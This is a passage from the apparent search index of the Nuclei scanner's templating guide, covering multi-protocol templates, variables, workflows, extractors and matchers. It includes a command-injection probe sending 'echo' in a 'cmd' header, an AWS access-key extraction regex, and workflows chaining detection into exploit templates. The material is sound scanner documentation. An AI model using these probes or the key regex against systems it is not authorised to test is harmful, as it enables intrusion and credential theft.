multi protocol templates, there are many other use cases where variables can be used to make templates more readable and maintainable How Multi Protocol Templates Work & Things to Note \u00b6 At this point we have seen how multi protocol templates look like and what are the features it brings to the table. Now let's see how multi protocol templates work and things to keep in mind while writing them. Multi Protocol Templates are executed in order of protocols defined in template Protocols in multi protocol templates are executed in serial i.e one after another Response fields of protocols are exported to template context as soon as that protocol is executed Variables are scoped at template level and evaluated after each protocol execution Multi protocol brings limited indirect support for preprocessing(using variables) and postprocessing(using dynamic extractors+dsl) for protocols Known Limitations and Workarounds \u00b6 Currently there is no direct way to handle arrays (i.e if exported variable is not just a single element but an array). A possible workaround for this is to index elements of array Example consider ssl_subject_an which is subject alternative names present in ssl certificate of target, if target has more than 1 Subject Alternative Name then ssl_subject_an will be an array of all Subject Alternative Names and assume vulnerabilty needs to check cname records of all Subject Alternative Names then that is not possible directly and only the first element in array is used but if we want to use all elements of array then we can use index to access each element of array starting from 1 // example // ssl_subject_an = [github.io,projectdiscovery.io,scanme.sh] then ssl_subject_an = github.io ssl_subject_an1 = projectdiscovery.io ssl_subject_an2 = scanme.sh dns : - name : \"{{ssl_subject_an}}\" # DNS Request type : cname - name : \"{{ssl_subject_an1}}\" # DNS Request type : cname - name : \"{{ssl_subject_an2}}\" # DNS Request type : cname - name : \"{{ssl_subject_an3}}\" # DNS Request type : cname In Above dns request example we are using index to access each element of array and send dns request for each element of array if array only contains 2 elements then last 2 requests are skipped with unresolved variables warning Note there are multiple ways to achieve this. An alternative implementation for this is to use payloads Features are implemented based on use cases and feedback from community, if you have any usecase that requires improvements to multi protocol execution or regarding array variables then please open a issue with details and proper usecase FAQ \u00b6 What Protocols are supported in Multi-Protocol Execution Mode ? There is no restriction around any protocol and any protocol available/implemented in nuclei engine can be used in multi protocol templates How many protocols can be used in Multi-Protocol Execution Mode ? There is no restriction around number of protocols but currently duplicated protocols are not supported i.e dns -> http -> ssl -> http. Please open a issue if you have a vulnerabilty/usecase that requires duplicated protocols What happens if a protocol fails ? Multi Protocol Execution follows exit on error policy i.e if protocol fails to execute then execution of remaining protocols is skipped and template execution is stopped How is multi protocol execution different from workflows ? Workflow as name suggest is a workflow that executes templates based on workflow file Workflow does not contain actual logic of vulnerability but just a workflow that executes different templates Workflow supports conditional execution of multiple templates Workflow has limited supported for variables and dynamic extractors To summarize workflow is a step higher than template and manages execution of templates based on workflow file Is it supported in nuclei v2 ? No, Multi Protocol Execution is only supported in nuclei v3 and above","title":"Multi Protocol Execution"},{"location":"templating-guide/multiprotocol/#multi-protocol-execution-beta","text":"Nuclei supports many protocol such as HTTP,DNS,Network etc and one can write nuclei template for a vulnerability in any of these protocols, but what if a vulnerability requires execution of multiple protocols in sync to test/exploit it. A classic example of this is Subdomain Takeovers where one needs to check for CNAME record of a subdomain and then check if the service is vulnerable to takeover or not. This was partially possible in nuclei with workflows but with Nuclei v3.0 it is now possible to easily write a Template that can execute multiple protocols in sync and then perform checks on the results of each protocol along with other improvements.","title":"Multi Protocol Execution (beta)"},{"location":"templating-guide/multiprotocol/#example","text":"id : dns-http-template info : name : dns + http takeover template author : pdteam severity : info dns : - name : \"{{FQDN}}\" # DNS Request type : cname extractors : - type : dsl name : exported_cname dsl : - cname internal : true http : - method : GET # http request path : - \"{{BaseURL}}\" matchers : - type : dsl dsl : - contains(body,'Domain not found') # check for http string - contains(exported_cname, 'github.io') # check for cname (extracted information from dns response) condition : and As we can see in above example there is no new logic or syntax just write logic for each protocol and then use dynamic extractor to export that variable and it is shared across all protocols and we call this Template Context which contains all variables that are scoped at template Level.","title":"Example"},{"location":"templating-guide/multiprotocol/#features","text":"Features that make multi protocol execution powerful Export Data Using Dynamic Extractors Template Scoped Protocol Responses Shared Variables Across Protocols","title":"Features"},{"location":"templating-guide/multiprotocol/#export-data-using-dynamic-extractors","text":"If you are not familiar with dynamic extractors then please read dynamic extractor section first. Earlier Dynamic Extractors support was only available for specific protocol or Workflows but with multi protocol execution dynamic extracted values are stored in template context and can be used across all protocols.","title":"Export Data Using Dynamic Extractors"},{"location":"templating-guide/multiprotocol/#example_1","text":"id : dns-http-template info : name : dns + http takeover template author : pdteam severity : info dns : - name : \"{{FQDN}}\" # DNS Request type : cname extractors : - type : dsl name : exported_cname dsl : - cname internal : true http : - method : GET # http request path : - \"{{BaseURL}}\" matchers : - type : dsl dsl : - contains(body,'Domain not found') # check for http string - contains(exported_cname, 'github.io') # check for cname (extracted information from dns response) condition : and","title":"Example"},{"location":"templating-guide/multiprotocol/#template-scoped-protocol-responses","text":"In Previous example we saw how to export dns cname and use it in http request but what if there are more than 4 protocols in a template and we want to export subject_dn , ns , cname , all_headers and what not. this can be done just by adding more dynamic extractors but that will add lot of noise to template and redundant logic and at some point it will hard to track and maintain all those variables. To address this Multi protocol execution brings support for template scoped protocol responses i.e all response fields of all protocols in template are available in template context with protocol prefix. Ex: Protocol Response Field Exported Variable ssl subject_dn ssl_subject_dn dns ns dns_ns dns cname dns_cname http all_headers http_all_headers Note This is just a example but response fields of all protocols used in multi protocol template are exported","title":"Template Scoped Protocol Responses"},{"location":"templating-guide/multiprotocol/#example_2","text":"id : dns-ssl-http-proto-prefix info : name : multi protocol request with response fields author : pdteam severity : info dns : - name : \"{{FQDN}}\" # DNS Request type : cname ssl : - address : \"{{Hostname}}\" # ssl request http : - method : GET # http request path : - \"{{BaseURL}}\" matchers : - type : dsl dsl : - contains(http_body,'ProjectDiscovery.io') # check for http string - trim_suffix(dns_cname,'.ghost.io.') == 'projectdiscovery' # check for cname (extracted information from dns response) - ssl_subject_cn == 'blog.projectdiscovery.io' condition : and List all available response fields To list all exported response fields write a multi protocol template and run it with -debug -svd flag and it will print all exported response fields Ex: nuclei -t multi-protocol-template.yaml -u scanme.sh -debug -svd","title":"Example"},{"location":"templating-guide/multiprotocol/#shared-variables-across-protocols","text":"As we can tell now multi protocol execution brings lot of flexibility and power to write complex templates but there are some cases where logic requires some kind of preprocessing to variables before they are used, again this can be achieved by using variables and helper functions directly in request but that will make template ugly and unreadable and this is especially true with network templates. For example consider Apache Airflow <=1.10.10 - Command Injection which requires base64-encoding,decoding,concat,interactsh_urls and then payload is ready to use, if all this logic is implemented in protocol request itself then it will be hard to read and maintain i.e why we have variables , to reuse variables and make payloads readable and easy to maintain, it is also necessary for other cases where generated interactsh urls needs to be same across multiple requests/protocols etc. For this reason multi protocol execution supports variables and they are also scoped at template context and can be used across all protocols for preprocessing, payload building etc.","title":"Shared Variables Across Protocols"},{"location":"templating-guide/multiprotocol/#example_3","text":"id : dns-ssl-http-with-variables info : name : multi protocol request with variables author : pdteam severity : info variables : cname_filtered : '{{trim_suffix(dns_cname,\".ghost.io.\")}}' dns : - name : \"{{FQDN}}\" # DNS Request type : cname ssl : - address : \"{{Hostname}}\" # ssl request http : - method : GET # http request path : - \"{{BaseURL}}\" matchers : - type : dsl dsl : - contains(http_body,'ProjectDiscovery.io') # check for http string - cname_filtered == 'projectdiscovery' # check for cname (extracted information from dns response) - ssl_subject_cn == 'blog.projectdiscovery.io' condition : and The above template and previous one are same but in this case we are using variables to preprocess dns_cname and then use it in http request later on Note This is just a example of how variables can be used in multi protocol templates, there are many other use cases where variables can be used to make templates more readable and maintainable","title":"Example"},{"location":"templating-guide/multiprotocol/#how-multi-protocol-templates-work-things-to-note","text":"At this point we have seen how multi protocol templates look like and what are the features it brings to the table. Now let's see how multi protocol templates work and things to keep in mind while writing them. Multi Protocol Templates are executed in order of protocols defined in template Protocols in multi protocol templates are executed in serial i.e one after another Response fields of protocols are exported to template context as soon as that protocol is executed Variables are scoped at template level and evaluated after each protocol execution Multi protocol brings limited indirect support for preprocessing(using variables) and postprocessing(using dynamic extractors+dsl) for protocols","title":"How Multi Protocol Templates Work &amp; Things to Note"},{"location":"templating-guide/multiprotocol/#known-limitations-and-workarounds","text":"Currently there is no direct way to handle arrays (i.e if exported variable is not just a single element but an array). A possible workaround for this is to index elements of array Example consider ssl_subject_an which is subject alternative names present in ssl certificate of target, if target has more than 1 Subject Alternative Name then ssl_subject_an will be an array of all Subject Alternative Names and assume vulnerabilty needs to check cname records of all Subject Alternative Names then that is not possible directly and only the first element in array is used but if we want to use all elements of array then we can use index to access each element of array starting from 1 // example // ssl_subject_an = [github.io,projectdiscovery.io,scanme.sh] then ssl_subject_an = github.io ssl_subject_an1 = projectdiscovery.io ssl_subject_an2 = scanme.sh dns : - name : \"{{ssl_subject_an}}\" # DNS Request type : cname - name : \"{{ssl_subject_an1}}\" # DNS Request type : cname - name : \"{{ssl_subject_an2}}\" # DNS Request type : cname - name : \"{{ssl_subject_an3}}\" # DNS Request type : cname In Above dns request example we are using index to access each element of array and send dns request for each element of array if array only contains 2 elements then last 2 requests are skipped with unresolved variables warning Note there are multiple ways to achieve this. An alternative implementation for this is to use payloads Features are implemented based on use cases and feedback from community, if you have any usecase that requires improvements to multi protocol execution or regarding array variables then please open a issue with details and proper usecase","title":"Known Limitations and Workarounds"},{"location":"templating-guide/multiprotocol/#faq","text":"What Protocols are supported in Multi-Protocol Execution Mode ? There is no restriction around any protocol and any protocol available/implemented in nuclei engine can be used in multi protocol templates How many protocols can be used in Multi-Protocol Execution Mode ? There is no restriction around number of protocols but currently duplicated protocols are not supported i.e dns -> http -> ssl -> http. Please open a issue if you have a vulnerabilty/usecase that requires duplicated protocols What happens if a protocol fails ? Multi Protocol Execution follows exit on error policy i.e if protocol fails to execute then execution of remaining protocols is skipped and template execution is stopped How is multi protocol execution different from workflows ? Workflow as name suggest is a workflow that executes templates based on workflow file Workflow does not contain actual logic of vulnerability but just a workflow that executes different templates Workflow supports conditional execution of multiple templates Workflow has limited supported for variables and dynamic extractors To summarize workflow is a step higher than template and manages execution of templates based on workflow file Is it supported in nuclei v2 ? No, Multi Protocol Execution is only supported in nuclei v3 and above","title":"FAQ"},{"location":"templating-guide/preprocessors/","text":"Template Preprocessors \u00b6 Certain pre-processors can be specified globally anywhere in the template that run as soon as the template is loaded to achieve things like random ids generated for each template run. randstr \u00b6 Info Generates a random ID for a template on each nuclei run. This can be used anywhere in the template and will always contain the same value. randstr can be suffixed by a number, and new random ids will be created for those names too. Ex. {{randstr_1}} which will remain same across the template. randstr is also supported within matchers and can be used to match the inputs. For example:- http : - method : POST path : - \"{{BaseURL}}/level1/application/\" headers : cmd : echo '{{randstr}}' matchers : - type : word words : - '{{randstr}}'","title":"Preprocessors"},{"location":"templating-guide/preprocessors/#template-preprocessors","text":"Certain pre-processors can be specified globally anywhere in the template that run as soon as the template is loaded to achieve things like random ids generated for each template run.","title":"Template Preprocessors"},{"location":"templating-guide/preprocessors/#randstr","text":"Info Generates a random ID for a template on each nuclei run. This can be used anywhere in the template and will always contain the same value. randstr can be suffixed by a number, and new random ids will be created for those names too. Ex. {{randstr_1}} which will remain same across the template. randstr is also supported within matchers and can be used to match the inputs. For example:- http : - method : POST path : - \"{{BaseURL}}/level1/application/\" headers : cmd : echo '{{randstr}}' matchers : - type : word words : - '{{randstr}}'","title":"randstr"},{"location":"templating-guide/variables/","text":"Variables \u00b6 Variables can be used to declare some values which remain constant throughout the template. The value of the variable once calculated does not change. Variables can be either simple strings or DSL helper functions. If the variable is a helper function, it is enclosed in double-curly brackets {{<expression>}} . Variables are declared at template level. Example variables - variables : a1 : \"test\" # A string variable a2 : \"{{to_lower(rand_base(5))}}\" # A DSL function variable Currently, dns , http , headless and network protocols support variables. Example of templates with variables - # Variable example using HTTP requests id : variables-example info : name : Variables Example author : pdteam severity : info variables : a1 : \"value\" a2 : \"{{base64('hello')}}\" http : - raw : - | GET / HTTP/1.1 Host: {{FQDN}} Test: {{a1}} Another: {{a2}} stop-at-first-match : true matchers-condition : or matchers : - type : word words : - \"value\" - \"aGVsbG8=\" # Variable example for network requests id : variables-example info : name : Variables Example author : pdteam severity : info variables : a1 : \"PING\" a2 : \"{{base64('hello')}}\" tcp : - host : - \"{{Hostname}}\" inputs : - data : \"{{a1}}\" read-size : 8 matchers : - type : word part : data words : - \"{{a2}}\" Constants \u00b6 In addition to variables, you can also define constants in templates. Constants are similar to variables but have a distinct difference: their values cannot be overridden or changed, even by command-line variables. They are used to declare scalar values that remain fixed throughout the template. Constants are helpful when you want to ensure that a specific value remains unchanged across multiple template executions. To declare a constant, use the constants keyword followed by the constant name and its value. Constants are declared at the template level, just like variables. Example constants: constants : p : test In the above example, p is a constant with the values test Here's an example template that uses constants: id : constants-example info : name : Constants Example author : pdteam severity : info constants : p : test http : - raw : - | GET /api/data?param={{p}} HTTP/1.1 Host: {{Hostname}} matchers : - type : word words : - \"OK\" If the same variable is passed via CLI, the value remains test ( nuclei -V p=anothervalue ... ). Constants provide a way to ensure that specific values remain constant and cannot be modified, providing consistency and predictability in your templates.","title":"Variables"},{"location":"templating-guide/variables/#variables","text":"Variables can be used to declare some values which remain constant throughout the template. The value of the variable once calculated does not change. Variables can be either simple strings or DSL helper functions. If the variable is a helper function, it is enclosed in double-curly brackets {{<expression>}} . Variables are declared at template level. Example variables - variables : a1 : \"test\" # A string variable a2 : \"{{to_lower(rand_base(5))}}\" # A DSL function variable Currently, dns , http , headless and network protocols support variables. Example of templates with variables - # Variable example using HTTP requests id : variables-example info : name : Variables Example author : pdteam severity : info variables : a1 : \"value\" a2 : \"{{base64('hello')}}\" http : - raw : - | GET / HTTP/1.1 Host: {{FQDN}} Test: {{a1}} Another: {{a2}} stop-at-first-match : true matchers-condition : or matchers : - type : word words : - \"value\" - \"aGVsbG8=\" # Variable example for network requests id : variables-example info : name : Variables Example author : pdteam severity : info variables : a1 : \"PING\" a2 : \"{{base64('hello')}}\" tcp : - host : - \"{{Hostname}}\" inputs : - data : \"{{a1}}\" read-size : 8 matchers : - type : word part : data words : - \"{{a2}}\"","title":"Variables"},{"location":"templating-guide/variables/#constants","text":"In addition to variables, you can also define constants in templates. Constants are similar to variables but have a distinct difference: their values cannot be overridden or changed, even by command-line variables. They are used to declare scalar values that remain fixed throughout the template. Constants are helpful when you want to ensure that a specific value remains unchanged across multiple template executions. To declare a constant, use the constants keyword followed by the constant name and its value. Constants are declared at the template level, just like variables. Example constants: constants : p : test In the above example, p is a constant with the values test Here's an example template that uses constants: id : constants-example info : name : Constants Example author : pdteam severity : info constants : p : test http : - raw : - | GET /api/data?param={{p}} HTTP/1.1 Host: {{Hostname}} matchers : - type : word words : - \"OK\" If the same variable is passed via CLI, the value remains test ( nuclei -V p=anothervalue ... ). Constants provide a way to ensure that specific values remain constant and cannot be modified, providing consistency and predictability in your templates.","title":"Constants"},{"location":"templating-guide/workflows/","text":"Workflows \u00b6 Workflows allow users to define an execution sequence for templates. The templates will be run on the defined conditions. These are the most efficient way to use nuclei, where all the templates are configured based on needs of users. This means, you can create Technology Based / Target based workflows, like WordPress Workflow, Jira Workflow which only run when the specific technology is detected. All templates part of a workflow share a common execution context, hence the named extractors from a template are accessible to other templates just by referring to it with its name. If the tech stack is known, we recommend creating your custom workflows to run your scans. This leads to much lower scan times with better results. Workflows can be defined with workflows attribute, following the template / subtemplates and tags to execute. workflows : - template : technologies/template-to-execute.yaml Type of workflows Generic workflows Conditional workflows Generic Workflows \u00b6 In generic workflow one can define single or multiple template to be executed from a single workflow file. It supports both files and directories as input. A workflow that runs all config related templates on the list of give URLs. workflows : - template : files/git-config.yaml - template : files/svn-config.yaml - template : files/env-file.yaml - template : files/backup-files.yaml - tags : xss,ssrf,cve,lfi A workflow that runs specific list of checks defined for your project. workflows : - template : cves/ - template : exposed-tokens/ - template : exposures/ - tags : exposures Conditional Workflows \u00b6 You can also create conditional templates which execute after matching the condition from a previous template. This is mostly useful for vulnerability detection and exploitation as well as tech based detection and exploitation. Use-cases for this kind of workflows are vast and varied. Templates based condition check A workflow that executes subtemplates when base template gets matched. workflows : - template : technologies/jira-detect.yaml subtemplates : - tags : jira - template : exploits/jira/ Matcher Name based condition check A workflow that executes subtemplates when a matcher of base template is found in result. workflows : - template : technologies/tech-detect.yaml matchers : - name : vbulletin subtemplates : - template : exploits/vbulletin-exp1.yaml - template : exploits/vbulletin-exp2.yaml - name : jboss subtemplates : - template : exploits/jboss-exp1.yaml - template : exploits/jboss-exp2.yaml In similar manner, one can create as many and as nested checks for workflows as needed. Subtemplate and matcher name based multi level conditional check A workflow showcasing chain of template executions that run only if the previous templates get matched. workflows : - template : technologies/tech-detect.yaml matchers : - name : lotus-domino subtemplates : - template : technologies/lotus-domino-version.yaml subtemplates : - template : cves/xx-yy-zz.yaml subtemplates : - template : cves/xx-xx-xx.yaml Conditional workflows are great examples of performing checks and vulnerability detection in most efficient manner instead of spraying all the templates on all the targets and generally come with good ROI on your time and is gentle for the targets as well. Shared Execution Context \u00b6 Nuclei engine supports transparent workflow cookiejar and key-value sharing across templates parts of a same workflow. Here follow an example of a workflow that extract a value from the first template and use it in the second conditional one: id : key-value-sharing-example info : name : Key Value Sharing Example author : pdteam severity : info workflows : - template : template-with-named-extractor.yaml subtemplates : - template : template-using-named-extractor.yaml For example, the following templates extract href links from a target web page body and make the value available under the extracted key: # template-with-named-extractor.yaml id : value-sharing-template1 info : name : value-sharing-template1 author : pdteam severity : info http : - path : - \"{{BaseURL}}/path1\" extractors : - type : regex part : body name : extracted regex : - 'href=\"(.*)\"' group : 1 Finally the second template in the workflow will use the obtained value by referencing the extractor name ( extracted ): # template-using-named-extractor.yaml id : value-sharing-template2 info : name : value-sharing-template2 author : pdteam severity : info http : - raw : - | GET /path2 HTTP/1.1 Host: {{Hostname}} {{extracted}} More complete workflow examples are provided here","title":"Workflows"},{"location":"templating-guide/workflows/#workflows","text":"Workflows allow users to define an execution sequence for templates. The templates will be run on the defined conditions. These are the most efficient way to use nuclei, where all the templates are configured based on needs of users. This means, you can create Technology Based / Target based workflows, like WordPress Workflow, Jira Workflow which only run when the specific technology is detected. All templates part of a workflow share a common execution context, hence the named extractors from a template are accessible to other templates just by referring to it with its name. If the tech stack is known, we recommend creating your custom workflows to run your scans. This leads to much lower scan times with better results. Workflows can be defined with workflows attribute, following the template / subtemplates and tags to execute. workflows : - template : technologies/template-to-execute.yaml Type of workflows Generic workflows Conditional workflows","title":"Workflows"},{"location":"templating-guide/workflows/#generic-workflows","text":"In generic workflow one can define single or multiple template to be executed from a single workflow file. It supports both files and directories as input. A workflow that runs all config related templates on the list of give URLs. workflows : - template : files/git-config.yaml - template : files/svn-config.yaml - template : files/env-file.yaml - template : files/backup-files.yaml - tags : xss,ssrf,cve,lfi A workflow that runs specific list of checks defined for your project. workflows : - template : cves/ - template : exposed-tokens/ - template : exposures/ - tags : exposures","title":"Generic Workflows"},{"location":"templating-guide/workflows/#conditional-workflows","text":"You can also create conditional templates which execute after matching the condition from a previous template. This is mostly useful for vulnerability detection and exploitation as well as tech based detection and exploitation. Use-cases for this kind of workflows are vast and varied. Templates based condition check A workflow that executes subtemplates when base template gets matched. workflows : - template : technologies/jira-detect.yaml subtemplates : - tags : jira - template : exploits/jira/ Matcher Name based condition check A workflow that executes subtemplates when a matcher of base template is found in result. workflows : - template : technologies/tech-detect.yaml matchers : - name : vbulletin subtemplates : - template : exploits/vbulletin-exp1.yaml - template : exploits/vbulletin-exp2.yaml - name : jboss subtemplates : - template : exploits/jboss-exp1.yaml - template : exploits/jboss-exp2.yaml In similar manner, one can create as many and as nested checks for workflows as needed. Subtemplate and matcher name based multi level conditional check A workflow showcasing chain of template executions that run only if the previous templates get matched. workflows : - template : technologies/tech-detect.yaml matchers : - name : lotus-domino subtemplates : - template : technologies/lotus-domino-version.yaml subtemplates : - template : cves/xx-yy-zz.yaml subtemplates : - template : cves/xx-xx-xx.yaml Conditional workflows are great examples of performing checks and vulnerability detection in most efficient manner instead of spraying all the templates on all the targets and generally come with good ROI on your time and is gentle for the targets as well.","title":"Conditional Workflows"},{"location":"templating-guide/workflows/#shared-execution-context","text":"Nuclei engine supports transparent workflow cookiejar and key-value sharing across templates parts of a same workflow. Here follow an example of a workflow that extract a value from the first template and use it in the second conditional one: id : key-value-sharing-example info : name : Key Value Sharing Example author : pdteam severity : info workflows : - template : template-with-named-extractor.yaml subtemplates : - template : template-using-named-extractor.yaml For example, the following templates extract href links from a target web page body and make the value available under the extracted key: # template-with-named-extractor.yaml id : value-sharing-template1 info : name : value-sharing-template1 author : pdteam severity : info http : - path : - \"{{BaseURL}}/path1\" extractors : - type : regex part : body name : extracted regex : - 'href=\"(.*)\"' group : 1 Finally the second template in the workflow will use the obtained value by referencing the extractor name ( extracted ): # template-using-named-extractor.yaml id : value-sharing-template2 info : name : value-sharing-template2 author : pdteam severity : info http : - raw : - | GET /path2 HTTP/1.1 Host: {{Hostname}} {{extracted}} More complete workflow examples are provided here","title":"Shared Execution Context"},{"location":"templating-guide/operators/extractors/","text":"Extractors \u00b6 Extractors can be used to extract and display in results a match from the response returned by a module. Types \u00b6 Multiple extractors can be specified in a request. As of now we support five type of extractors. regex - Extract data from response based on a Regular Expression. kval - Extract key: value / key=value formatted data from Response Header/Cookie json - Extract data from JSON based response in JQ like syntax. xpath - Extract xpath based data from HTML Response dsl - Extract data from the response based on a DSL expressions. Regex Extractor \u00b6 Example extractor for HTTP Response body using regex - extractors : - type : regex # type of the extractor part : body # part of the response (header,body,all) regex : - \"(A3T[A-Z0-9]|AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}\" # regex to use for extraction. Kval Extractor \u00b6 A kval extractor example to extract content-type header from HTTP Response. extractors : - type : kval # type of the extractor kval : - content_type # header/cookie value to extract from response Note that content-type has been replaced with content_type because kval extractor does not accept dash ( - ) as input and must be substituted with underscore ( _ ). JSON Extractor \u00b6 A json extractor example to extract value of id object from JSON block. - type : json # type of the extractor part : body name : user json : - '.[] | .id' # JQ like syntax for extraction For more details about JQ - https://github.com/stedolan/jq Xpath Extractor \u00b6 A xpath extractor example to extract value of href attribute from HTML response. extractors : - type : xpath # type of the extractor attribute : href # attribute value to extract (optional) xpath : - '/html/body/div/p[2]/a' # xpath value for extraction With a simple copy paste in browser , we can get the xpath value form any web page content. DSL Extractor \u00b6 A dsl extractor example to extract the effective body length through the len helper function from HTTP Response. extractors : - type : dsl # type of the extractor dsl : - len(body) # dsl expression value to extract from response Dynamic Extractor \u00b6 Extractors can be used to capture Dynamic Values on runtime while writing Multi-Request templates. CSRF Tokens, Session Headers, etc. can be extracted and used in requests. This feature is only available in RAW request format. Example of defining a dynamic extractor with name api which will capture a regex based pattern from the request. extractors : - type : regex name : api part : body internal : true # Required for using dynamic variables regex : - \"(?m)[0-9]{3,10}\\\\.[0-9]+\" The extracted value is stored in the variable api , which can be utilised in any section of the subsequent requests. If you want to use extractor as a dynamic variable, you must use internal: true to avoid printing extracted values in the terminal. An optional regex match-group can also be specified for the regex for more complex matches. extractors : - type : regex # type of extractor name : csrf_token # defining the variable name part : body # part of response to look for # group defines the matching group being used. # In GO the \"match\" is the full array of all matches and submatches # match[0] is the full match # match[n] is the submatches. Most often we'd want match[1] as depicted below group : 1 regex : - '<input\\sname=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\"\\s/>' The above extractor with name csrf_token will hold the value extracted by ([[:alnum:]]{16}) as abcdefgh12345678 . If no group option is provided with this regex, the above extractor with name csrf_token will hold the full match (by <input name=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\" /> ) as <input name=\"csrf_token\" type=\"hidden\" value=\"abcdefgh12345678\" /> .","title":"Extractors"},{"location":"templating-guide/operators/extractors/#extractors","text":"Extractors can be used to extract and display in results a match from the response returned by a module.","title":"Extractors"},{"location":"templating-guide/operators/extractors/#types","text":"Multiple extractors can be specified in a request. As of now we support five type of extractors. regex - Extract data from response based on a Regular Expression. kval - Extract key: value / key=value formatted data from Response Header/Cookie json - Extract data from JSON based response in JQ like syntax. xpath - Extract xpath based data from HTML Response dsl - Extract data from the response based on a DSL expressions.","title":"Types"},{"location":"templating-guide/operators/extractors/#regex-extractor","text":"Example extractor for HTTP Response body using regex - extractors : - type : regex # type of the extractor part : body # part of the response (header,body,all) regex : - \"(A3T[A-Z0-9]|AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}\" # regex to use for extraction.","title":"Regex Extractor"},{"location":"templating-guide/operators/extractors/#kval-extractor","text":"A kval extractor example to extract content-type header from HTTP Response. extractors : - type : kval # type of the extractor kval : - content_type # header/cookie value to extract from response Note that content-type has been replaced with content_type because kval extractor does not accept dash ( - ) as input and must be substituted with underscore ( _ ).","title":"Kval Extractor"},{"location":"templating-guide/operators/extractors/#json-extractor","text":"A json extractor example to extract value of id object from JSON block. - type : json # type of the extractor part : body name : user json : - '.[] | .id' # JQ like syntax for extraction For more details about JQ - https://github.com/stedolan/jq","title":"JSON Extractor"},{"location":"templating-guide/operators/extractors/#xpath-extractor","text":"A xpath extractor example to extract value of href attribute from HTML response. extractors : - type : xpath # type of the extractor attribute : href # attribute value to extract (optional) xpath : - '/html/body/div/p[2]/a' # xpath value for extraction With a simple copy paste in browser , we can get the xpath value form any web page content.","title":"Xpath Extractor"},{"location":"templating-guide/operators/extractors/#dsl-extractor","text":"A dsl extractor example to extract the effective body length through the len helper function from HTTP Response. extractors : - type : dsl # type of the extractor dsl : - len(body) # dsl expression value to extract from response","title":"DSL Extractor"},{"location":"templating-guide/operators/extractors/#dynamic-extractor","text":"Extractors can be used to capture Dynamic Values on runtime while writing Multi-Request templates. CSRF Tokens, Session Headers, etc. can be extracted and used in requests. This feature is only available in RAW request format. Example of defining a dynamic extractor with name api which will capture a regex based pattern from the request. extractors : - type : regex name : api part : body internal : true # Required for using dynamic variables regex : - \"(?m)[0-9]{3,10}\\\\.[0-9]+\" The extracted value is stored in the variable api , which can be utilised in any section of the subsequent requests. If you want to use extractor as a dynamic variable, you must use internal: true to avoid printing extracted values in the terminal. An optional regex match-group can also be specified for the regex for more complex matches. extractors : - type : regex # type of extractor name : csrf_token # defining the variable name part : body # part of response to look for # group defines the matching group being used. # In GO the \"match\" is the full array of all matches and submatches # match[0] is the full match # match[n] is the submatches. Most often we'd want match[1] as depicted below group : 1 regex : - '<input\\sname=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\"\\s/>' The above extractor with name csrf_token will hold the value extracted by ([[:alnum:]]{16}) as abcdefgh12345678 . If no group option is provided with this regex, the above extractor with name csrf_token will hold the full match (by <input name=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\" /> ) as <input name=\"csrf_token\" type=\"hidden\" value=\"abcdefgh12345678\" /> .","title":"Dynamic Extractor"},{"location":"templating-guide/operators/matchers/","text":"Matchers \u00b6 Matchers allow different type of flexible comparisons on protocol responses. They are what makes nuclei so powerful, checks are very simple to write and multiple checks can be added as per need for very effective scanning. Types \u00b6 Multiple matchers can be specified in a request. There are basically 6 types of matchers: Matcher Type Part Matched status Integer Comparisons of Part size Content Length of Part word Part for a protocol regex Part for a protocol binary Part for a protocol dsl Part for a protocol To match status codes for responses, you can use the following syntax. matchers : # Match the status codes - type : status # Some status codes we want to match status : - 200 - 302 To match binary for hexadecimal responses, you can use the following syntax. matchers : - type : binary binary : - \"504B0304\" # zip archive - \"526172211A070100\" # RAR archive version 5.0 - \"FD377A585A0000\" # xz tar.xz archive condition : or part : body Matchers also support hex encoded data which will be decoded and matched. matchers : - type : word encoding : hex words : - \"50494e47\" part : body Word and Regex matchers can be further configured depending on the needs of the users. Complex matchers of type dsl allows building more elaborate expressions with helper functions. These function allow access to Protocol Response which contains variety of data based on each protocol. See protocol specific documentation to learn about different returned results. matchers : - type : dsl dsl : - \"len(body)<1024 && status_code==200\" # Body length less than 1024 and 200 status code - \"contains(toupper(body), md5(cookie))\" # Check if the MD5 sum of cookies is contained in the uppercase body Every part of a Protocol response can be matched with DSL matcher. Some examples - Response Part Description Example content_length Content-Length Header content_length >= 1024 status_code Response Status Code status_code==200 all_headers Unique string containing all headers len(all_headers) body Body as string len(body) header_name Lowercase header name with - converted to _ len(user_agent) raw Headers + Response len(raw) Conditions \u00b6 Multiple words and regexes can be specified in a single matcher and can be configured with different conditions like AND and OR . AND - Using AND conditions allows matching of all the words from the list of words for the matcher. Only then will the request be marked as successful when all the words have been matched. OR - Using OR conditions allows matching of a single word from the list of matcher. The request will be marked as successful when even one of the word is matched for the matcher. Matched Parts \u00b6 Multiple parts of the response can also be matched for the request, default matched part is body if not defined. Example matchers for HTTP response body using the AND condition: matchers : # Match the body word - type : word # Some words we want to match words : - \"[core]\" - \"[config]\" # Both words must be found in the response body condition : and # We want to match request body (default) part : body Similarly, matchers can be written to match anything that you want to find in the response body allowing unlimited creativity and extensibility. Negative Matchers \u00b6 All types of matchers also support negative conditions, mostly useful when you look for a match with an exclusions. This can be used by adding negative: true in the matchers block. Here is an example syntax using negative condition, this will return all the URLs not having PHPSESSID in the response header. matchers : - type : word words : - \"PHPSESSID\" part : header negative : true Multiple Matchers \u00b6 Multiple matchers can be used in a single template to fingerprint multiple conditions with a single request. Here is an example of syntax for multiple matchers. matchers : - type : word name : php words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" part : header - type : word name : node words : - \"Server: NodeJS\" - \"X-Powered-By: nodejs\" condition : or part : header - type : word name : python words : - \"Python/2.\" - \"Python/3.\" condition : or part : header Matchers Condition \u00b6 While using multiple matchers the default condition is to follow OR operation in between all the matchers, AND operation can be used to make sure return the result if all matchers returns true. matchers-condition : and matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : or part : header - type : word words : - \"PHP\" part : body","title":"Matchers"},{"location":"templating-guide/operators/matchers/#matchers","text":"Matchers allow different type of flexible comparisons on protocol responses. They are what makes nuclei so powerful, checks are very simple to write and multiple checks can be added as per need for very effective 